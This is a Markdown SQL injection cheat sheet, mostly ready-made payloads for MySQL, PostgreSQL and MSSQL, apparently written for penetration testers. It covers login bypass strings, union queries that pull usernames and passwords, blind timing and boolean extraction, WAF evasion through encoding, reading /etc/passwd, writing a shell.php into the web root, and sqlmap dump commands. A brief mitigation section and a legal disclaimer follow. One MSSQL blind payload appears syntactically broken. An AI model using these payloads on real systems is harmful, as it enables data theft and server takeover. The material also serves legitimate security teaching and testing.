# SQL Injection Cheatsheet 🔐

Quick reference untuk SQL Injection payloads dan techniques.

---

## 🎯 Basic Payloads

### Authentication Bypass

```sql
# Classic bypass
admin' --
admin'#
' OR 1=1 --
' OR 'a'='a
admin' OR '1'='1

# With comment variations
admin'/*
admin' %00

# Using username field only
' OR 1=1 -- -
' OR 1=1#
' OR 1=1/*
```

---

## 💬 SQL Comments

| Database | Comment Syntax | Example |
|----------|---------------|---------|
| MySQL | `--`, `#`, `/* */` | `admin' -- comment` |
| PostgreSQL | `--`, `/* */` | `admin' -- comment` |
| MSSQL | `--`, `/* */` | `admin' -- comment` |
| Oracle | `--`, `/* */` | `admin' -- comment` |

**Important:** 
- `--` requires a space after it in some databases
- Use `-- -` to be safe (with trailing space)

---

## 🔍 Detection Techniques

### Test for SQL Injection

```sql
# Test 1: Single quote
'
Expected: Error or unusual behavior

# Test 2: Boolean-based
' AND 1=1 --    (should work)
' AND 1=2 --    (should fail)

# Test 3: Time-based
'; WAITFOR DELAY '00:00:05' --  (MSSQL)
'; SELECT SLEEP(5) --           (MySQL)
'; SELECT pg_sleep(5) --        (PostgreSQL)

# Test 4: Union-based
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
```

---

## 🎓 Union-Based Injection

### Step 1: Find number of columns

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
# Continue until error (that's the column count)

# Or use UNION
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

### Step 2: Find vulnerable columns

```sql
' UNION SELECT 'a', NULL, NULL --
' UNION SELECT NULL, 'a', NULL --
' UNION SELECT NULL, NULL, 'a' --
```

### Step 3: Extract data

```sql
# MySQL
' UNION SELECT username, password, NULL FROM users --
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --

# Get database version
' UNION SELECT @@version, NULL, NULL --
' UNION SELECT version(), NULL, NULL --

# Get current user
' UNION SELECT user(), NULL, NULL --
' UNION SELECT current_user(), NULL, NULL --

# Get database name
' UNION SELECT database(), NULL, NULL --
```

---

## 🕵️ Information Gathering

### MySQL

```sql
# Database version
SELECT @@version
SELECT version()

# Current database
SELECT database()

# Current user
SELECT user()
SELECT current_user()

# List databases
SELECT schema_name FROM information_schema.schemata

# List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

# List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

# Read file (if FILE privilege)
SELECT LOAD_FILE('/etc/passwd')

# Write file (if FILE privilege)
SELECT 'shell' INTO OUTFILE '/var/www/html/shell.php'
```

### PostgreSQL

```sql
# Version
SELECT version()

# Current database
SELECT current_database()

# Current user
SELECT current_user

# List databases
SELECT datname FROM pg_database

# List tables
SELECT tablename FROM pg_tables WHERE schemaname='public'

# List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### MSSQL

```sql
# Version
SELECT @@version

# Current database
SELECT DB_NAME()

# Current user
SELECT SYSTEM_USER
SELECT USER_NAME()

# List databases
SELECT name FROM sys.databases

# List tables
SELECT name FROM sys.tables

# List columns
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users')
```

---

## ⏱️ Time-Based Blind Injection

### MySQL
```sql
' AND SLEEP(5) --
' OR IF(1=1, SLEEP(5), 0) --

# Extract data bit by bit
' OR IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
```

### PostgreSQL
```sql
'; SELECT pg_sleep(5) --
' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

### MSSQL
```sql
'; WAITFOR DELAY '00:00:05' --
' OR IF(1=1, WAITFOR DELAY '00:00:05', 0) --
```

---

## 🎭 Boolean-Based Blind Injection

```sql
# Test condition
' AND 1=1 --  (TRUE - page normal)
' AND 1=2 --  (FALSE - page different)

# Extract database name
' AND SUBSTRING(database(),1,1)='a' --
' AND SUBSTRING(database(),1,1)='b' --

# Extract version
' AND SUBSTRING(@@version,1,1)='5' --

# Extract user
' AND SUBSTRING(user(),1,1)='r' --
```

---

## 🚫 Bypassing WAF/Filters

### Case Variation
```sql
SeLeCt
sElEcT
UNION
uNiOn
```

### Comment Insertion
```sql
SEL/**/ECT
UN/**/ION
SEL/*comment*/ECT
```

### URL Encoding
```sql
%27 = '
%23 = #
%2d%2d = --
%20 = space
%0a = newline
```

### Double Encoding
```sql
%2527 = %27 = '
%252d%252d = %2d%2d = --
```

### Alternative Syntax
```sql
# Instead of spaces
SELECT/**/username/**/FROM/**/users
SELECT+username+FROM+users
SELECT%09username%09FROM%09users  (tab)
SELECT%0Ausername%0AFROM%0Ausers  (newline)

# Instead of quotes
SELECT * FROM users WHERE id = CHAR(97)  (a)
SELECT * FROM users WHERE id = 0x61     (hex)
```

### Obfuscation
```sql
# Using functions
CONCAT('ad','min')
CHAR(97,100,109,105,110)

# Hex encoding
0x61646d696e = admin

# Unicode
\u0061\u0064\u006d\u0069\u006e = admin
```

---

## 🛠️ Tools

### sqlmap
```bash
# Basic scan
sqlmap -u "http://example.com/page?id=1"

# With POST data
sqlmap -u "http://example.com/login" --data="username=admin&password=pass"

# Specify parameter
sqlmap -u "http://example.com/page?id=1" -p id

# Get databases
sqlmap -u "http://example.com/page?id=1" --dbs

# Get tables
sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# Get columns
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --columns

# Dump data
sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump

# Using proxy (Burp)
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

### Manual Testing with curl
```bash
# GET request
curl "http://example.com/page?id=1' OR 1=1 --"

# POST request
curl -X POST http://example.com/login \
  -d "username=admin' --&password=test"

# With cookies
curl -b "PHPSESSID=abc123" "http://example.com/page?id=1"

# Follow redirects
curl -L "http://example.com/page?id=1"
```

---

## 📚 Common Injection Points

```
1. URL Parameters
   http://example.com/page?id=1
   
2. POST Data
   username=admin&password=pass
   
3. HTTP Headers
   User-Agent: ...
   Referer: ...
   Cookie: ...
   X-Forwarded-For: ...
   
4. JSON Data
   {"username": "admin", "password": "pass"}
   
5. XML Data
   <user><name>admin</name></user>
```

---

## ⚠️ Mitigation

### 1. Prepared Statements (Parameterized Queries)

**PHP:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Python:**
```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password))
```

**Java:**
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);
```

### 2. Input Validation

```php
// Whitelist
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid input");
}

// Escape (not recommended as primary defense)
$username = mysqli_real_escape_string($conn, $username);
```

### 3. Least Privilege
- Don't use admin/root for web apps
- Grant minimal necessary permissions
- Use separate users for read/write operations

### 4. WAF (Web Application Firewall)
- ModSecurity
- Cloudflare WAF
- AWS WAF

---

## 🎯 Quick Reference

| Task | MySQL | PostgreSQL | MSSQL |
|------|-------|------------|-------|
| Version | `@@version` | `version()` | `@@version` |
| Database | `database()` | `current_database()` | `DB_NAME()` |
| User | `user()` | `current_user` | `SYSTEM_USER` |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '00:00:05'` |
| Comment | `--`, `#` | `--` | `--` |

---

## 📖 Practice Resources

- **PortSwigger Academy** - Free SQL Injection labs
- **DVWA** - Damn Vulnerable Web Application
- **SQLi Labs** - Practice SQL Injection
- **HackTheBox** - Various SQL Injection boxes
- **TryHackMe** - SQL Injection rooms

---

**⚠️ Legal Disclaimer:**
Use these techniques only on:
- Your own systems
- CTF platforms
- Bug bounty programs with proper authorization
- Systems where you have explicit permission

Unauthorized testing is illegal!

---

**Last Updated:** February 2026
